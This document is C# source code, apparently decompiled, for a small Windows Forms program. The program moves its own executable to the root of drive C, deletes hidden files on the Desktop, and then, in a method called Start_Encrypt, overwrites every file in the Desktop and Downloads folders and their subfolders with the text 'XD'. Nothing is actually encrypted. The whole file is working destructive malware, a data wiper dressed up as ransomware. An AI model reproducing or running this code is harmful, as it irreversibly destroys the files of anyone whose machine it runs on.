using System;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace WindowsFormsApp71;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		string executablePath = Application.get_ExecutablePath();
		string text = "C:\\WindowsFormsApp71.exe";
		try
		{
			if (!File.Exists(executablePath))
			{
				using (File.Create(executablePath))
				{
				}
			}
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			File.Move(executablePath, text);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		Start_Encrypt();
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		for (int i = 0; i < files.Length; i++)
		{
			using StreamWriter streamWriter = new StreamWriter(files[i]);
			streamWriter.WriteLine("XD");
		}
		for (int j = 0; j < files2.Length; j++)
		{
			using StreamWriter streamWriter2 = new StreamWriter(files2[j]);
			streamWriter2.WriteLine("XD");
		}
	}
}
